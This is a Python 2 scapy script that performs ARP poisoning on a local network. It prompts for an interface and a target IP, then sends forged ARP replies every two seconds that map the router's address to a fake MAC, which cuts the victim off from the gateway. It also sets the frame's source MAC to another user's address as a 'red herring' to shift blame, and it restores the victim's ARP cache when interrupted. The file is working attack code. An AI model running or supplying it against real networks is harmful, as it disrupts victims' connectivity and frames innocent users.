#!/usr/bin/env python

from scapy.all import *
import time
import signal
import sys
from hosts import * 
import netifaces

print "Available interfaces"

for interface in netifaces.interfaces():
	print interface,
print
interface = raw_input("What interface would you like to use?:\n")

machines = getNetwork(interface)

target = raw_input("Select target IP Address:\n")

router = min(machines)

print router

victimIP = target		#IP address of who we poison
victimMAC = machines[target][0]		#MAC address ""

myMAC = "08:00:27:f7:e8:72"		#MAC address of origin of poisioning 
					#set as another users MAC for Red herring attempt

deadEndIP = router		#IP address of host we dont want victim to talk to
deadEndMAC = machines[router][0]	#MAC address ""

killMAC = "08:00:27:ff:ff:fe"		#False MAC address


#Creating Poisoning packet

#Ethernet*****************
pkt = Ether()/ARP()	
pkt.dst = victimMAC		#Ethernet Destination
pkt.src = myMAC			#Ethernet Source
#*************************

#ARP**********************
pkt.pdst= victimIP		# (IP)
pkt.hwdst = victimMAC		# (MAC)Hey just to let you know...	
pkt.psrc = deadEndIP		# if you're trying to talk to...
pkt.hwsrc = killMAC		# His MAC address is ...
pkt.op = 2			# that's where he's at (is-at)
#*************************

print("Turn out the lights....")

try:
	while True:
		sendp(pkt, iface=interface)
		time.sleep(2)

except KeyboardInterrupt:
	print("Re-ARPing....")
	heal = Ether()/ARP()
	heal.src = myMAC
	heal.dst = victimMAC
	heal.hwsrc = deadEndMAC
	heal.hwdst = victimMAC
	heal.pdst = victimIP
	heal.psrc = deadEndIP
	heal.op = 2

	for i in range(0, 5):
		sendp(heal, iface=interface)
		time.sleep(1)

	sys.exit(0)
